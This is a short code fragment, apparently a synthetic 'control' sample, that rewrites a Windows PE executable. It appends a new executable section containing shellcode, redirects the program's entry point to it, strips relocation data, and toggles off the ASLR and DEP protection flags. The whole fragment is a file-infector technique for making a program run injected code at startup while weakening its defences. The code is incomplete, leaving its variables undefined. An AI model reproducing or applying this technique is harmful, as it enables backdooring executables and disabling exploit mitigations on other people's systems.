// Source-shape control: write a new executable section and transfer startup.
class Edit { void Rewrite() {
 nt.FileHeader.NumberOfSections = nt.FileHeader.NumberOfSections + 1;
 nt.OptionalHeader.SizeOfImage = nt.OptionalHeader.SizeOfImage + size;
 newsection.Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE;
 newsection.RawData = shellcode;
 nt.OptionalHeader.AddressOfEntryPoint = newsection.VirtualAddress;
 nt.OptionalHeader.DataDirectory[5].VirtualAddress = 0;
 nt.FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
 nt.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
 nt.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
} }
